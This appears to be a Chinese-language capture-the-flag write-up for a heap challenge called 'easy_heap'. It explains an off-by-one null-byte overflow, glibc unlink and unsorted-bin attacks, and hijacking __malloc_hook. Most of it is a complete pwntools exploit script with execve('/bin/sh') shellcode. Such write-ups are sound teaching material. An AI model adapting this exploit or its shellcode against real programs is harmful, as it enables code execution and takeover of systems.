[TOC]
# 溢出点
null by one
```
unsigned __int64 __fastcall sub_E2D(__int64 a1, unsigned __int64 a2)
{
  char buf; // [rsp+13h] [rbp-Dh]
  int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i < a2; ++i )
  {
    if ( read(0, &buf, 1uLL) <= 0 )
    {
      perror("Read failed!\n");
      exit(-1);
    }
    if ( buf == '\n' )
      break;
    *(_BYTE *)(a1 + i) = buf;
  }
  if ( i == a2 )
    *(_BYTE *)(i + a1) = 0;
  return __readfsqword(0x28u) ^ v5;
}
```
# 攻击方式
unlink
unsorted bin

## unlink 
实现方式
```
#define unlink(AV, P, BK, FD) {                                            \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {								      \
        FD->bk = BK;							      \
        BK->fd = FD;							      \
        if (!in_smallbin_range (P->size)&& __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
          if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
            malloc_printerr (check_action,				      \
                "corrupted double-linked list (not small)",    \
                P, AV);					      \
                if (FD->fd_nextsize == NULL) {				      \
                    if (P->fd_nextsize == P)				      \
                      FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                    else {							      \
                        FD->fd_nextsize = P->fd_nextsize;			      \
                        FD->bk_nextsize = P->bk_nextsize;			      \
                        P->fd_nextsize->bk_nextsize = FD;			      \
                        P->bk_nextsize->fd_nextsize = FD;			      \
                      }							      \
                  } else {							      \
                    P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                    P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
                  }								      \
          }								      \
      }									      \
}
```

实现目的
global_pointer[n] = &global_pointer[n]-0x18


# 注入分析
1. unlink 实现任意地址写
2. unsorted bin attack  写入libc
3. 劫持__malloc_hook到mmap 分配地址
4. mmap地址写入shellcode

# exp
```
from pwn import *
context.log_level = 'debug'
context.arch = "amd64"
def Alloc(size):
    sh.sendlineafter('>> ', '1')
    sh.sendlineafter('Size: ', str(size))
    sh.recvuntil('Pointer Address ')
    return int(sh.recvline(), 16)

def Delete(index):
    sh.sendlineafter('>> ', '2')
    sh.sendlineafter('Index: ', str(index))

def Fill(index, content):
    sh.sendlineafter('>> ', '3')
    sh.sendlineafter('Index: ', str(index))
    sh.sendlineafter('Content: ', content)

sh = process('easy_heap')
sh.recvuntil("Mmap: ")
mmap_addr = int(sh.recvline(),16)
log.info("mmap_addr: " + hex(mmap_addr))

image_base_addr = Alloc(0x38) - 0x202068 # index 0
log.info("image_base_addr: " + hex(image_base_addr))

Alloc(0x38) # index 1
Alloc(0xf8) # index 2
Alloc(0x18) # index 3

#unlink
Fill(1,p64(0x0)+p64(0x31)+p64(image_base_addr + 0x202078 - 0x18)+p64(image_base_addr + 0x202078 - 0x10)+p64(0)*2+p64(0x30))

Delete(2)


Fill(1, p64(0x100) + "\x68")
Fill(0,p64(image_base_addr+0x202058))

Alloc(0x128)

Fill(1,p64(0x100)+"\x10")
Fill(0,p64(mmap_addr))

shellcode = asm('''
mov rax, 0x0068732f6e69622f
push rax

mov rdi, rsp
xor rsi, rsi
mul rsi
mov al, 59
syscall

xor rdi, rdi
mov al, 60
syscall
''')
Fill(1,p64(0x100)+p64(mmap_addr))
Fill(0, shellcode)

sh.sendlineafter('>> ', '1')
sh.sendlineafter('Size: ', str(8))

sh.interactive()

```


